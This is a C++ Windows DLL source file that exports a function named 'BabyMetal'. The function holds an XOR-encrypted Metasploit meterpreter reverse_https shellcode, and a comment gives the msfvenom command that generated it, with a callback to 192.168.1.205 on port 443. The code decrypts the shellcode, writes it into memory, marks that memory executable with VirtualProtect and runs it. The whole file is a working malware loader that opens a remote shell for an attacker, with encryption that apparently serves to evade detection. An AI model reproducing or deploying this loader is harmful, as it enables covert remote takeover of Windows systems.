#include <Windows.h>
#include <stdio.h>

DWORD threadID;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved){
	switch (ul_reason_for_call){
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

extern "C" __declspec(dllexport) BOOL BabyMetal(){
	//  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.205 LPORT=443 -f C --encrypt xor --encrypt-key m
    unsigned char buf[] =
"\x91\x25\xee\x89\x9d\x85\xa1\x6d\x6d\x6d\x2c\x3c\x2c\x3d\x3f"
"\x3c\x3b\x25\x5c\xbf\x08\x25\xe6\x3f\x0d\x25\xe6\x3f\x75\x25"
"\xe6\x3f\x4d\x25\xe6\x1f\x3d\x25\x62\xda\x27\x27\x20\x5c\xa4"
"\x25\x5c\xad\xc1\x51\x0c\x11\x6f\x41\x4d\x2c\xac\xa4\x60\x2c"
"\x6c\xac\x8f\x80\x3f\x2c\x3c\x25\xe6\x3f\x4d\xe6\x2f\x51\x25"
"\x6c\xbd\x0b\xec\x15\x75\x66\x6f\x62\xe8\x1f\x6d\x6d\x6d\xe6"
"\xed\xe5\x6d\x6d\x6d\x25\xe8\xad\x19\x0a\x25\x6c\xbd\x3d\xe6"
"\x25\x75\x29\xe6\x2d\x4d\x24\x6c\xbd\x8e\x3b\x25\x92\xa4\x2c"
"\xe6\x59\xe5\x25\x6c\xbb\x20\x5c\xa4\x25\x5c\xad\xc1\x2c\xac"
"\xa4\x60\x2c\x6c\xac\x55\x8d\x18\x9c\x21\x6e\x21\x49\x65\x28"
"\x54\xbc\x18\xb5\x35\x29\xe6\x2d\x49\x24\x6c\xbd\x0b\x2c\xe6"
"\x61\x25\x29\xe6\x2d\x71\x24\x6c\xbd\x2c\xe6\x69\xe5\x25\x6c"
"\xbd\x2c\x35\x2c\x35\x33\x34\x37\x2c\x35\x2c\x34\x2c\x37\x25"
"\xee\x81\x4d\x2c\x3f\x92\x8d\x35\x2c\x34\x37\x25\xe6\x7f\x84"
"\x26\x92\x92\x92\x30\x25\x5c\xb6\x3e\x24\xd3\x1a\x04\x03\x04"
"\x03\x08\x19\x6d\x2c\x3b\x25\xe4\x8c\x24\xaa\xaf\x21\x1a\x4b"
"\x6a\x92\xb8\x3e\x3e\x25\xe4\x8c\x3e\x37\x20\x5c\xad\x20\x5c"
"\xa4\x3e\x3e\x24\xd7\x57\x3b\x14\xca\x6d\x6d\x6d\x6d\x92\xb8"
"\x85\x61\x6d\x6d\x6d\x5c\x54\x5f\x43\x5c\x5b\x55\x43\x5d\x43"
"\x59\x6d\x37\x25\xe4\xac\x24\xaa\xad\xd6\x6c\x6d\x6d\x20\x5c"
"\xa4\x3e\x3e\x07\x6e\x3e\x24\xd7\x3a\xe4\xf2\xab\x6d\x6d\x6d"
"\x6d\x92\xb8\x85\x42\x6d\x6d\x6d\x42\x08\x37\x3e\x1b\x35\x25"
"\x02\x25\x17\x3a\x34\x32\x3d\x39\x59\x32\x34\x34\x22\x15\x01"
"\x1a\x37\x04\x0e\x59\x14\x1b\x0e\x40\x37\x03\x23\x0f\x08\x27"
"\x0c\x1f\x5d\x28\x1f\x0c\x0f\x1c\x1e\x6d\x25\xe4\xac\x3e\x37"
"\x2c\x35\x20\x5c\xa4\x3e\x25\xd5\x6d\x5f\xc5\xe9\x6d\x6d\x6d"
"\x6d\x3d\x3e\x3e\x24\xaa\xaf\x86\x38\x43\x56\x92\xb8\x25\xe4"
"\xab\x07\x67\x32\x25\xe4\x9c\x07\x72\x37\x3f\x05\xed\x5e\x6d"
"\x6d\x24\xe4\x8d\x07\x69\x2c\x34\x24\xd7\x18\x2b\xf3\xeb\x6d"
"\x6d\x6d\x6d\x92\xb8\x20\x5c\xad\x3e\x37\x25\xe4\x9c\x20\x5c"
"\xa4\x20\x5c\xa4\x3e\x3e\x24\xaa\xaf\x40\x6b\x75\x16\x92\xb8"
"\xe8\xad\x18\x72\x25\xaa\xac\xe5\x7e\x6d\x6d\x24\xd7\x29\x9d"
"\x58\x8d\x6d\x6d\x6d\x6d\x92\xb8\x25\x92\xa2\x19\x6f\x86\xc7"
"\x85\x38\x6d\x6d\x6d\x3e\x34\x07\x2d\x37\x24\xe4\xbc\xac\x8f"                                                                                                                                                           
"\x7d\x24\xaa\xad\x6d\x7d\x6d\x6d\x24\xd7\x35\xc9\x3e\x88\x6d"                                                                                                                                                           
"\x6d\x6d\x6d\x92\xb8\x25\xfe\x3e\x3e\x25\xe4\x8a\x25\xe4\x9c"                                                                                                                                                           
"\x25\xe4\xb7\x24\xaa\xad\x6d\x4d\x6d\x6d\x24\xe4\x94\x24\xd7"                                                                                                                                                           
"\x7f\xfb\xe4\x8f\x6d\x6d\x6d\x6d\x92\xb8\x25\xee\xa9\x4d\xe8"                                                                                                                                                           
"\xad\x19\xdf\x0b\xe6\x6a\x25\x6c\xae\xe8\xad\x18\xbf\x35\xae"                                                                                                                                                           
"\x35\x07\x6d\x34\xd6\x8d\x70\x47\x67\x2c\xe4\xb7\x92\xb8";

    unsigned char plain[sizeof(buf)];

    // xor decrypt shellcode with key 'm'
    for (int i = 0; i < sizeof(buf); i++){
		plain[i] = buf[i] ^ 'm';
	}

    // allocate space for shellcode
    void *exec = VirtualAlloc(0, sizeof(plain), MEM_COMMIT, PAGE_READWRITE);

    // copy shellcode to memory
    memcpy(exec, plain, sizeof(plain));

    // make memory executable
    DWORD oldperms = 0;
    VirtualProtect(exec, sizeof(plain), PAGE_EXECUTE, &oldperms);


    // jump to shellcode
    (*(void (*)()) exec)();
  
    return true;
}